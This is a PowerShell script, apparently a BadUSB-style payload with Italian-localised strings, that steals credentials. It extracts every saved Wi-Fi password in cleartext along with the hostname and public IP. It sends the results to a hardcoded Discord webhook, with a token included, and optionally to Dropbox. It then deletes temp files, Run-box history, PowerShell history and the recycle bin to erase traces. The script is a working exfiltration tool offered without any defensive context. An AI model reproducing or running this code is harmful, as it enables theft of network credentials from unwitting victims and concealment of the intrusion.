############################################################################################################################################################

$wifiProfiles = (netsh wlan show profiles | Select-String "\:(.+)$")| ForEach-Object { $name = $_.Matches.Groups[1].Value.Trim(); $_ } | ForEach-Object { (netsh wlan show profile name="$name" key=clear) } | Select-String "contenuto chiave\W+\:(.+)$" | ForEach-Object { $pass = $_.Matches.Groups[1].Value.Trim(); $_ } | ForEach-Object { [PSCustomObject]@{ PROFILE_NAME = $name; PASSWORD = $pass } } | Format-Table -AutoSize -Force | Out-String  

$hostname = 'Computer Hacked:' + ' ' + ( hostname )  > $env:TEMP/--wifi-pass.txt
#$ipconfig = ipconfig | Select-String "Indirizzo IPv4\W+\:(.+)$" | Out-String >> $env:TEMP/--wifi-pass.txt
'Public IP:' + ' ' + (Invoke-WebRequest -uri "https://api.ipify.org/").Content | Out-String >> $env:TEMP/--wifi-pass.txt
$wifiProfiles >> $env:TEMP/--wifi-pass.txt

$dc = "https://discord.com/api/webhooks/1138288917762814023/4BAQnhMGpOvBZ-6z6HtcistpUnq6MNWp42P_jo9e_PL_VutGo3vuPzEOOPQzuit5UnTi"

############################################################################################################################################################

# Upload output file to Dropbox

function DropBox-Upload {

[CmdletBinding()]
param (
	
[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
[Alias("f")]
[string]$SourceFilePath
) 
$outputFile = Split-Path $SourceFilePath -leaf
$TargetFilePath="/$outputFile"
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + $db
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg", $arg)
$headers.Add("Content-Type", 'application/octet-stream')
Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}

if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $env:TEMP/--wifi-pass.txt}

############################################################################################################################################################

function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = "$dc"

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TEMP/--wifi-pass.txt"}

 

############################################################################################################################################################

function Clean-Exfil { 

# empty temp folder
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue

# Empty recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue

}

############################################################################################################################################################

if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}


RI $env:TEMP/--wifi-pass.txt
